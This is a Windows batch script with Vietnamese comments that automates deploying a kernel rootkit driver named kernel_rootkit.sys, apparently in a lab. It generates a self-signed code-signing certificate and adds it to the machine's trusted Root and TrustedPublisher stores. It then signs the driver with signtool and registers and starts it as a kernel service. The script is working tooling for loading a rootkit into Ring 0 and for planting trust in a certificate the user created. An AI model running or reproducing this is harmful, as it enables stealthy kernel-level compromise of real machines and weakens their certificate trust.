@echo off
cd /d "%~dp0"
cls

echo ===================================================
echo     QUY TRINH TU DONG KY SO BANG POWERSHELL VAI GIAY
echo ===================================================

:: 1. Kiểm tra file SignTool thô có sẵn cạnh file .bat không
if not exist "signtool.exe" (
    echo [!] LOI: Khong tim thay file signtool.exe ngoài Desktop!
    echo       Hay dat file signtool.exe nam canh file .bat nay.
    goto END
)

if not exist "kernel_rootkit.sys" (
    echo [!] LOI: Khong tim thay file kernel_rootkit.sys!
    goto END
)

:: 2. Dọn dẹp cấu hình cũ
echo [*] Dang dung va xoa Driver cu (neu co)...
sc stop MyKernelRootkit >nul 2>&1
sc delete MyKernelRootkit >nul 2>&1

:: 3. Dùng PowerShell tạo chứng chỉ kiểm thử chuẩn SHA-256 ngay tại chỗ
echo [*] Dang tu dong tao chung chi RootkitLabCert bang PowerShell...
powershell -Command "$cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject 'CN=RootkitLabCert' -KeyUsage DigitalSignature -FriendlyName 'Rootkit Lab Cert' -CertStoreLocation 'Cert:\CurrentUser\My'; $rootStore = New-Object System.Security.Cryptography.X509Certificates.X509Store -ArgumentList 'Root', 'LocalMachine'; $rootStore.Open('ReadWrite'); $rootStore.Add($cert); $rootStore.Close(); $pubStore = New-Object System.Security.Cryptography.X509Certificates.X509Store -ArgumentList 'TrustedPublisher', 'LocalMachine'; $pubStore.Open('ReadWrite'); $pubStore.Add($cert); $pubStore.Close();" >nul 2>&1

echo [+] Da tao va chen chung chi vao He thong thanh cong!

:: 4. Tiến hành ký số đè vào file .sys từ Kali Linux
echo [*] Dang dung signtool.exe de ky vao file kernel_rootkit.sys...
signtool.exe sign /v /s My /n RootkitLabCert /fd sha256 "kernel_rootkit.sys"

if errorlevel 1 (
    echo [!] LOI: Ky so Driver that bai! Hãy kiem tra quyen Admin.
    goto END
)

echo [+] File .sys da co chu ky so hop le!

:: 5. Tiến hành đăng ký và kích hoạt vào Ring 0
echo [*] Dang dang ky va kich hoat Driver vao Kernel...
sc create MyKernelRootkit type= kernel binPath= "%~dp0kernel_rootkit.sys"
sc start MyKernelRootkit

echo ===================================================
echo Hoan thanh! Hay mo DebugView xem Log chu 'Rootkit'.

:END
pause
